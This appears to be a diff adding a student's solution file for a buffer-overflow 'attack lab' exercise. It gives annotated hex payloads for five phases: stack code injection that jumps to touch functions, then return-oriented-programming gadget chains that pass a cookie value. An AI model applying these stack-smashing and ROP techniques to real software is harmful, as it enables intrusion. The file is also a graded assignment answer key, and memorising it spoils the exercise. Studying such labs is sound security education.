@@ -1,0 +1,51 @@
+Phase 1:
+>>> cat hexinput.txt
+01 02 03 04 01 02 03 04 // Padding
+01 02 03 04 01 02 03 04 // Padding
+01 02 03 04 01 02 03 04 // Padding
+50 18 40 00 00 00 00 00 // Address of touch1
+
+Phase 2:
+>>> cat hexinput.txt
+48 c7 c7 69 4f 1e 62 c3 // Move the constant $621e4f69 into %rdi
+00 00 00 00 00 00 00 00 // Padding
+00 00 00 00 00 00 00 00 // Padding
+a8 f6 67 55 00 00 00 00 // Address of the first line!
+7c 18 40 00 00 00 00 00 // Address of touch2
+
+Phase 3:
+>>> cat hexinput.txt
+48 c7 c7 d0 f6 67 55 c3 // Move memory address of cookie string into %rdi
+00 00 00 00 00 00 00 00 // Padding
+00 00 00 00 00 00 00 00 // Padding
+a8 f6 67 55 00 00 00 00 // Address of the first line!
+50 19 40 00 00 00 00 00 // Address of touch3
+36 32 31 65 34 66 36 39 // String representation of the cookie
+
+Phase 4:
+>>> cat hexinput.txt
+01 02 03 04 05 06 07 08 // Padding
+01 02 03 04 05 06 07 08 // Padding
+01 02 03 04 05 06 07 08 // Padding
+f0 19 40 00 00 00 00 00 // Gadget 1: setval_242 << pops %rax, then %rbx >>
+69 4f 1e 62 00 00 00 00 // Cookie
+e7 19 40 00 00 00 00 00 // Gadget 2: getval_184 << moves %rax into %rdi >>
+7c 18 40 00 00 00 00 00 // Address of touch2
+
+Phase 5:
+>>> cat hexinput.txt
+01 02 03 04 05 06 07 08 // Padding
+01 02 03 04 05 06 07 08 // Padding
+01 02 03 04 05 06 07 08 // Padding
+49 1a 40 00 00 00 00 00 // Gadget 1: setval_251 << moves %rsp into %rax >>
+e7 19 40 00 00 00 00 00 // Gadget 2: getval_184 << moves %rax into %rdi >>
+f0 19 40 00 00 00 00 00 // Gadget 3: setval_242 << pops %rax, // then %rbx >>
+48 00 00 00 00 00 00 00 // Distance between %rax pointer to our cookie
+c7 1a 40 00 00 00 00 00 // Gadget 5: setval_160 << moves %eax into %ecx >>
+69 1a 40 00 00 00 00 00 // Gadget 6: getval_173 << moves %ecx into %edx >>
+70 1a 40 00 00 00 00 00 // Gadget 7: setval_241 << moves %edx into %esi >>
+19 1a 40 00 00 00 00 00 // Gadget 8: add_xy << moves pointer into %rax >>
+e7 19 40 00 00 00 00 00 // Gadget 9: getval_184 << moves %rax into %rdi >>
+50 19 40 00 00 00 00 00 // Address of touch3
+36 32 31 65 34 66 36 39 00 // String representation of the cookie
+
